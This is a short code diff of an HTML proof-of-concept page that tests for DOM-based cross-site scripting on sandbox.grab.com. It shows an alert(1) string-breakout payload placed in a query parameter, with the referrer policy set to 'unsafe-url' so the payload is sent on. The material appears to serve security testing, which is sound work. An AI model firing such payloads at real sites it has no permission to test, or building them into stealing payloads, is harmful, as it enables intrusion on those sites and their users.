@@ -1,20 +1,11 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="UTF-8">
-  <title>DOM XSS PoC</title>
-</head>
-<body>
-<h2>Click the link to test DOM XSS on Sandbox.grab.com</h2>
 <a id="poc" href="#">Trigger PoC</a>
 
 <script>
-  // Your payload encoded in URL
-  const payload = "';alert(1);//";
+  const payload = '%22)%3Balert(1)%3B//'; // "});alert(1);//
 
-  // Replace href with the target site + payload in referrer
-  document.getElementById("poc").href =
-    "https://sandbox.grab.com/?dj5lsojznz=" + encodeURIComponent(payload);
+  const target = "https://sandbox.grab.com/?dj5lsojznz=" + payload;
+
+  const a = document.getElementById("poc");
+  a.href = target;
+  a.referrerPolicy = "unsafe-url";
 </script>
-</body>
-</html>
